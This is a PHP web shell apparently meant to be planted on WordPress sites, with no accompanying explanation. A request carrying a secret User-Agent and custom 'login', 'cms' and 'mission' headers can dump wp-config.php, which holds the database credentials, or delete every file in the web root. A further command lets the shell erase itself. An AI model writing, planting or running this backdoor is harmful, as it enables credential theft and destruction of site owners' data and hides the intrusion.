<?php
$ROOT=$_SERVER['DOCUMENT_ROOT'];
$DIR=scandir($ROOT);

// getting headers from user
$headers=getallheaders();
$UG=$headers['User-Agent'];
$LOGIN=$headers['login'];
$CMS=$headers['cms'];
$MISSION=$headers['mission'];


switch ($MISSION) {
	case 'getconfig':
		if ($UG=='suka_ibana' && $LOGIN=='root' && $CMS=='wp') {
			$conf=readfile('wp-config.php');
			echo ($conf);
		}
		break;
	case 'destroy':
		# code...
		foreach ($DIR as $key) {
			if($UG=='suka_ibana' && $LOGIN=='root' && $CMS=='wp'){
				if (!is_dir($key)) {
					unlink($ROOT.'/'.$key);
				}
			}
		}
		break;
	case 'delete':
		unlink(__FILE__);
		break;
	
}
?>
